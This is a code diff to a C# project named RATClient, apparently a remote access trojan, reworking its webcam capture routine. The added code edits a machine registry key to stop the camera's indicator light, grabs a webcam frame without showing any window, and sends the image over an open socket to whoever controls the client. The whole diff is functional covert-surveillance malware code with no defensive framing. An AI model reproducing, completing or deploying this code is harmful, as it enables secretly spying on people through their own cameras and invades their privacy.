@@ -12,6 +12,10 @@ using System.Drawing.Imaging;
 using ScreenShotDemo;
 using System.Drawing;
 
+using DirectShowLib;
+using SnapShot;
+using System.Runtime.InteropServices;
+
 namespace RATClient
 {
     class Program
@@ -287,32 +291,58 @@ namespace RATClient
         }
         static void captureWebcam()
         {
-            Console.WriteLine("Entered webcam capture");
+            //try to modify the camera registry key to avoid that annoying popup. This requires admin rights on the process.
             try
             {
-                WebCamService.Capture capture = new WebCamService.Capture();
-                capture.Start();
-                Console.WriteLine("Capture started");
-                IntPtr image = capture.GetBitMap();
-                Console.WriteLine("Image captured");
-                Bitmap imageBitmap = new Bitmap(capture.Width, capture.Height, capture.Stride, PixelFormat.DontCare, image);
-                Console.WriteLine("Converted to bitmap");
-                ImageConverter converter = new ImageConverter();
-                byte[] imgBytes = (byte[])converter.ConvertTo(imageBitmap, typeof(byte[]));
-                Console.WriteLine("Converted to byte[]");
-                openSock.Send(imgBytes);
-                Console.WriteLine("Image sent");
-                capture.Dispose();
-                Console.WriteLine("Capture closed.");
-            }catch(Exception e)
-            {
-                Console.WriteLine("Error occured in webcam processing: ");
-                Console.WriteLine(e);
-                byte[] errorBytes = Encoding.ASCII.GetBytes("webcamError♦");
-                openSock.Send(errorBytes);
-                Console.WriteLine("Error sent.");
+                string regPath = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\OEM\\Device\\Capture";
+                Microsoft.Win32.Registry.SetValue(regPath, "NoPhysicalCameraLED", 0);
             }
+            catch
+            {
+
+            }
+
+            int VIDEODEVICE = 0; // zero based index of video capture device to use
+            int VIDEOWIDTH = 640; // Depends on video device caps
+            int VIDEOHEIGHT = 480; // Depends on video device caps
+            short VIDEOBITSPERPIXEL = 24; // BitsPerPixel values determined by device
+            System.Windows.Forms.PictureBox dummy = null; //Used to block an ActivePlayer window from popping
+            Capture cam = new Capture(VIDEODEVICE, VIDEOWIDTH, VIDEOHEIGHT, VIDEOBITSPERPIXEL, dummy); //Capture has been very delicately re-worked for this process.
+            IntPtr m_ip = IntPtr.Zero;
+            if (m_ip != IntPtr.Zero)//Verify that we're zeroed out on our waiting IntPtr, and if we're not, free it with the marshall.
+            {
+                Marshal.FreeCoTaskMem(m_ip);
+                m_ip = IntPtr.Zero;
+            }
+
+
+            m_ip = cam.Click();  //check click method in capture for forms functions [Done, clean]. 
+                                 //This used to open a window for capture, but with new Capture.cs it's not anymore
+
+            Bitmap b = new Bitmap(cam.Width, cam.Height, cam.Stride, PixelFormat.Format24bppRgb, m_ip); //get bitmaps
+
+            b.RotateFlip(RotateFlipType.RotateNoneFlipY); //flip and rotate the resulting image
+
+            var stream = new MemoryStream(); //define a memory stream for use in translation to byte[] for transmit
+
+            b.Save(stream, System.Drawing.Imaging.ImageFormat.Png);  //save b into a memory stream
+
+
+            //b.Save("debug.bmp");//Save for debugging
+
+            byte[] byteArray = stream.ToArray();  //obtain byte[] from memory stream for transmit
+
+            Console.WriteLine("starting image send");
+            openSock.Send(byteArray);
+            Console.WriteLine("image send complete");
             
+
+            stream.Dispose(); //dispose of the stream
+
+            cam.Dispose(); //dispose of the camera
+
+            Marshal.FreeCoTaskMem(m_ip); //free the int pointer
+
         }
         static void Main(string[] args)
         {
